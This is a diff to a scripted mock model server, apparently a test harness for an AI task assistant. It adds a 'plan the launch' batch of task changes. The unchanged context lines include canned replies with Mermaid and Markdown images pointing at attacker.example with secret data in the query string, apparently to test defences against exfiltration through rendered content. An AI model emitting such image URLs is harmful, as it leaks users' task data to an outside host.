@@ -13,8 +13,10 @@
 //   list_task_statuses, then update_task (an approval with before → after); "tasks" / "open tasks": list_tasks, then an
 //   answer that quotes the totals Orbit worked out and names a few task keys (chips); "show GEN-1": get_task;
 //   "list docs": list_docs; "move GEN-2 to In Progress, then keep reading": the change, then get_task again and again
-//   until Orbit's step limit stops the run (its summary card must still show); a message with "@" mentions: the
-//   names Orbit resolved for them; anything else: an echo.
+//   until Orbit's step limit stops the run (its summary card must still show); "plan the launch" (or "batch"):
+//   list_projects, list_task_statuses and list_tasks, then one propose_changes batch of eight changes (six new tasks,
+//   one with a Markdown description, and two updates of existing tasks), then an answer with what Orbit reported per
+//   change; a message with "@" mentions: the names Orbit resolved for them; anything else: an echo.
 
 const port = Number(process.argv[2] ?? 18_960)
 /** Optional pause before each answer (ms), so a recording looks like a real model at work. */
@@ -81,6 +83,47 @@ function firstId(value: unknown): string | undefined {
   return (list?.[0] as { id?: string } | undefined)?.id
 }
 
+const LAUNCH_TASKS = ['Write the launch post', 'Record the demo video', 'Update the pricing page', 'Brief the support team', 'Prepare the press kit', 'Schedule the social posts']
+
+/** "Plan the launch": read the project, its statuses and tasks, then propose eight changes as one batch. */
+function plan(messages: Message[], name: string | undefined, content: string): Response | null {
+  type Item = { id: string; title?: string; version?: number; status_id?: string }
+  const projects = resultOf(messages, 'list_projects')
+  const project = firstId(projects)
+  const statuses = ((resultOf(messages, 'list_task_statuses') as { items?: Item[] } | null)?.items ?? []) as Item[]
+  if (name === 'list_projects') return project ? call('list_task_statuses', { project_id: project }) : say('You have no project yet.')
+  if (name === 'list_task_statuses') return call('list_tasks', { project_id: project, limit: 10 }, 'And what is already planned.')
+  if (name === 'list_tasks') {
+    const tasks = ((unwrap(content) as { items?: Item[] } | null)?.items ?? []).slice(0, 2)
+    const todo = statuses[0]?.id
+    const doing = statuses[1]?.id ?? todo
+    const creates = LAUNCH_TASKS.map((title, index) => ({
+      tool: 'create_task',
+      input: {
+        project_id: project,
+        status_id: todo,
+        title,
+        priority: index < 2 ? 'high' : 'medium',
+        ...(index === 0 ? { description: '## Checklist\n- [ ] Draft\n- [ ] Review with **marketing**\n<b>shown as text, not HTML</b>' } : {}),
+      },
+    }))
+    const updates = tasks.map((task, index) => ({
+      tool: 'update_task',
+      input: index === 0 ? { task_id: task.id, expected_version: task.version ?? 1, status_id: doing } : { task_id: task.id, expected_version: task.version ?? 1, priority: 'urgent', due_at: '2026-12-01' },
+    }))
+    return call('propose_changes', { changes: [...creates, ...updates] }, `Here is a plan: ${creates.length} new tasks and ${updates.length} updates. Untick anything you do not want.`)
+  }
+  if (name === 'propose_changes') {
+    if (/declined this whole batch/i.test(content)) return say('OK, I made none of those changes.')
+    if (/expired/i.test(content)) return say('That plan expired before you answered; nothing was changed.')
+    const applied = (content.match(/: applied\./g) ?? []).length
+    const failed = (content.match(/: FAILED\./g) ?? []).length
+    const skipped = (content.match(/: NOT run/g) ?? []).length
+    return say(`Done: ${applied} applied${failed ? `, ${failed} failed` : ''}${skipped ? `, ${skipped} not run` : ''}. You can undo any of them from the summary below.`)
+  }
+  return null
+}
+
 function answer(messages: Message[]): Response {
   const userTexts = messages.filter((m) => m.role === 'user').flatMap((m) => (typeof m.content === 'string' ? [m.content] : m.content.filter((b) => b.type === 'text').map((b) => b.text ?? '')))
   const typed = userTexts.filter((text) => !text.startsWith('<page-context>') && !text.startsWith('<mentions>') && !text.startsWith('(Automatic check')).pop() ?? ''
@@ -100,6 +143,10 @@ function answer(messages: Message[]): Response {
     const result = results[results.length - 1]
     const name = calledName(result.tool_use_id)
     const content = result.content ?? ''
+    if (/plan the launch|\bbatch\b/i.test(asked)) {
+      const planned = plan(messages, name, content)
+      if (planned) return planned
+    }
     if (/declined/i.test(content)) return say('OK, I did not create it.')
     const changed = resultOf(messages, 'update_task')
     const reading = asked.match(/move ([A-Z][A-Z0-9]*-\d+) to /i)
@@ -174,6 +221,7 @@ function answer(messages: Message[]): Response {
     return say('Status:\n```mermaid\nflowchart TD\n  A@{ img: "https://attacker.example/m.png?d=secret", label: "status", pos: "t", h: 60, constraint: "on" }\n```')
   }
   if (/badge/i.test(asked)) return say('Status ![ok](https://attacker.example/b.png?d=secret-task-titles) and [details](https://attacker.example/x?d=1)')
+  if (/plan the launch|\bbatch\b/i.test(asked)) return call('list_projects', {}, 'Let me look at your projects first.')
   const moveTask = asked.match(/move ([A-Z][A-Z0-9]*-\d+) to /i)
   if (moveTask) return call('get_task', { task_id: moveTask[1].toUpperCase() }, `Let me look at ${moveTask[1].toUpperCase()}.`)
   if (/rename (the )?project to/i.test(asked)) return call('list_projects', {})
